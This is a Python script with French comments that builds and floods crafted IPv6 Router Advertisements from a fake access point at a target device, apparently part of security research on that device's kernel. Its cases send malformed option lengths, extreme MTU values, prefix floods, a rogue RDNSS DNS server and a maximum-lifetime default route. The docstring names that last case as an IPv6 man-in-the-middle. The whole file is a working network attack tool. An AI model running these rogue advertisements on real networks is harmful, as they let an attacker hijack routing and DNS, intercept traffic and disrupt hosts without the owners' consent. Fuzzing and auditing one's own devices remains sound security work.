#!/usr/bin/env python3
"""ra_fuzz — émet des Router Advertisements IPv6 malformés depuis l'AP (piveil,
interface wlan0). Parseur cible = noyau 4.4.22 du device (ndisc.c), audit fait :
ndisc_parse_options rejette l==0 et opt_len<l → boucle bornée ; PIO exige len==4.
Objectif résiduel : options aux longueurs frontières, MTU/PIO fonctionnels,
et l'effet ROUTE PAR DÉFAUT v6 (lifetime max) = MITM v6 si accept_ra actif.

Usage :
  sudo python3 ra_fuzz.py --iface wlan0 --case ctrl_ok
  sudo python3 ra_fuzz.py --iface wlan0 --case flood --count 50
Log : /tmp/fakeap/ra_fuzz.log
"""
import argparse
import fcntl
import socket
import struct
import time

LOGF = "/tmp/fakeap/ra_fuzz.log"


def log(m):
    line = "%s %s" % (time.strftime("%H:%M:%S"), m)
    with open(LOGF, "a") as f:
        f.write(line + "\n")
    print(line, flush=True)


def iface_mac_ll(s, ifname):
    """MAC + link-local d'une iface (via getsockname sur AF_PACKET/SIOCGIFHWADDR)."""
    import array
    si = socket.if_nametoindex(ifname)
    # MAC
    a = array.array("B", b"\0" * 32)
    r = fcntl.ioctl(s.fileno(), 0x8927, struct.pack("256s", ifname.encode()[:15]) + a.tobytes())
    mac = bytes(r[18:24])
    # link-local depuis /proc
    ll = None
    for line in open("/proc/net/if_inet6"):
        p = line.split()
        if p[5] == ifname:
            addr = p[0]
            b = bytes.fromhex(addr)
            ll = socket.inet_ntop(socket.AF_INET6, b)
            if ll.startswith("fe80"):
                break
    if not ll:
        # synthèse EUI-64
        eui = mac[:3] + [mac[3] ^ 2] + mac[4:]
        ll = "fe80::%02x%02x:%02x%02x:%02x%02x:%02x%02x" % (mac[0] ^ 2, mac[1], mac[2], 0xff, 0xfe, mac[3], mac[4], mac[5])
    return mac, socket.inet_pton(socket.AF_INET6, ll)


def icmp6_cksum(src, dst, payload):
    pseudo = src + dst + struct.pack("!I", len(payload)) + b"\x00\x00\x00\x3a"
    s = 0
    data = pseudo + payload
    if len(data) & 1:
        data += b"\x00"
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def ra_body(case, mac, now):
    hop = 64
    flags_m_o = 0
    lifetime = 1800
    reachable = 0
    retrans = 0
    opts = b""
    slla = bytes([1, 1]) + mac
    if case == "ctrl_ok":
        opts = slla + bytes([5, 1]) + b"\x00\x00" + struct.pack("!I", 1500)
        pio = bytes([3, 4, 64, 0x40]) + struct.pack("!III", 1800, 900, 0) + \
            socket.inet_pton(socket.AF_INET6, "fd00:feed::")
        opts += pio
    elif case == "optlen_zero":
        opts = slla + bytes([3, 0, 64, 0]) + b"\x00" * 6     # PIO len=0
    elif case == "optlen_overflow":
        opts = slla + bytes([24, 255, 0, 16]) + b"\x00" * 4  # route info len=255 (2040 o)
    elif case == "pio_prefixlen_129":
        pio = bytes([3, 4, 129, 0]) + struct.pack("!III", 1800, 900, 0) + \
            socket.inet_pton(socket.AF_INET6, "fd00:feed::")
        opts = slla + pio
    elif case == "pio_len_lie":
        opts = slla + bytes([3, 1, 64, 0]) + b"\x00\x00\x00"   # PIO nd_opt_len=1
    elif case == "mtu_huge":
        opts = slla + bytes([5, 1]) + b"\x00\x00" + struct.pack("!I", 0xFFFFFFFF)
    elif case == "mtu_576":
        opts = slla + bytes([5, 1]) + b"\x00\x00" + struct.pack("!I", 576)
    elif case == "mtu_len_lie":
        opts = slla + bytes([5, 2]) + b"\x00\x00" + struct.pack("!I", 1500) + b"\x00" * 8
    elif case == "lifetime_max":
        lifetime = 65535
        opts = slla + bytes([5, 1]) + b"\x00\x00" + struct.pack("!I", 1500)
        pio = bytes([3, 4, 64, 0x40]) + struct.pack("!III", 0xFFFFFFFF, 0xFFFFFFFF, 0) + \
            socket.inet_pton(socket.AF_INET6, "fd00:feed::")
        opts += pio
    elif case == "reachable_max":
        reachable = 0xFFFFFFFF
        opts = slla
    elif case == "managed":
        flags_m_o = 0x80
        opts = slla
    elif case == "pio_flood":
        for i in range(10):
            pfx = socket.inet_pton(socket.AF_INET6, "fd00:%02x::" % i)
            opts += bytes([3, 4, 64, 0x40]) + struct.pack("!III", 1800, 900, 0) + pfx
        opts = slla + opts
    elif case == "rdnss":
        opts = slla + bytes([25, 3, 0, 0]) + struct.pack("!I", 600) + \
            socket.inet_pton(socket.AF_INET6, "fd00:feed::53")
    elif case == "slla_zero":
        opts = bytes([1, 1]) + b"\x00" * 6
    else:
        raise SystemExit("cas inconnu: %s" % case)
    body = bytes([hop, flags_m_o]) + struct.pack("!H", lifetime) + \
        struct.pack("!II", reachable, retrans) + opts
    # type 134 (RA), code 0
    return bytes([134, 0, 0, 0]) + body


def build_frame(case, mac, ll):
    icmp = ra_body(case, mac, time.time())
    dst = socket.inet_pton(socket.AF_INET6, "ff02::1")
    ck = icmp6_cksum(ll, dst, icmp)
    icmp = icmp[:2] + struct.pack("!H", ck) + icmp[4:]
    plen = len(icmp)
    v6fl = (6 << 28)
    ip6 = struct.pack("!IHBB", v6fl, plen, 58, 255) + ll + dst
    eth = bytes.fromhex("333300000001") + mac + b"\x86\xdd"
    return eth + ip6 + icmp


CASES = ["ctrl_ok", "optlen_zero", "optlen_overflow", "pio_prefixlen_129",
         "pio_len_lie", "mtu_huge", "mtu_576", "mtu_len_lie", "lifetime_max",
         "reachable_max", "managed", "pio_flood", "rdnss", "slla_zero"]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", default="wlan0")
    ap.add_argument("--case", default="ctrl_ok")
    ap.add_argument("--count", type=int, default=5, help="nombre de RA")
    ap.add_argument("--interval", type=float, default=0.3)
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()
    if a.list:
        print("\n".join(CASES))
        return
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((a.iface, 0))
    mac, ll = iface_mac_ll(s, a.iface)
    log("=== ra_fuzz case=%s iface=%s mac=%s ll=%s ===" %
        (a.case, a.iface, mac.hex(":"), socket.inet_ntop(socket.AF_INET6, ll)))
    frame = build_frame(a.case, mac, ll)
    for i in range(a.count):
        s.send(frame)
        log("RA #%d envoyé (%d o)" % (i + 1, len(frame)))
        time.sleep(a.interval)


if __name__ == "__main__":
    main()
